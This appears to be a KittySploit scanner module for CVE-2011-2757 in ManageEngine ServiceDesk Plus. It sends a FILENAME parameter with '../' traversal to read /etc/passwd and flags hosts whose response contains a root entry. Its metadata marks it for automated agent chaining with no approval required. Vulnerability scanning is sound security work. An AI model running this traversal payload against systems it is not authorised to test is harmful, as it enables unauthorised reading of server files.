#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects CVE-2011-2757 via FileDownload."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ManageEngine SDP - FILENAME Traversal Detection (CVE-2011-2757)',
        'description': (
            'Detects CVE-2011-2757 via FileDownload.jsp?module=agent&FILENAME=../../../etc/passwd.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2011', 'manageengine', 'sdp', 'lfi', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2011-2757',
        ],
        'cve': 'CVE-2011-2757',
    }

    def run(self):
        trav = '../' * 9 + 'etc/passwd'
        for base in ('', '/sdp', '/ServiceDesk'):
            path = f'{base}/workorder/FileDownload.jsp?module=agent&FILENAME={trav}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'root:.*:0:0:', r.text or ''):
                self.set_info(severity='high', reason='ManageEngine SDP FILENAME traversal (CVE-2011-2757)', path=f'{base}/workorder/FileDownload.jsp')
                return True
        return False

